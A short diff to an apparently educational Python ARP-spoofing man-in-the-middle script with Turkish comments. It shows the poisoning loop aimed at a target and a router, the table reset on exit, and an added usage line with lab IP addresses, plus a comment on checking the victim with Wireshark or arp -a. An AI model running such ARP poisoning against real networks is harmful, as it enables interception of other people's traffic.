@@ -53,7 +53,6 @@ hedef = girdi.hedef_ip
 modem = girdi.modem_ip
 try:
     while True:
-        #saldırıyı yapıyoruz. windowsa gelip arp -a ile kontrol edebiliriz.
         arp_cevap(hedef, modem)
         arp_cevap(modem, hedef)
 
@@ -65,4 +64,6 @@ except KeyboardInterrupt :
     reset(hedef,modem)
     reset(modem,hedef)
 
+
 #kullanım örneği python3 mitm_attack.py -t 10.0.2.11 -r 10.0.2.1
+#saldırılan kurbanda wireshark ile kontrol edebiliriz veya arp -a ile
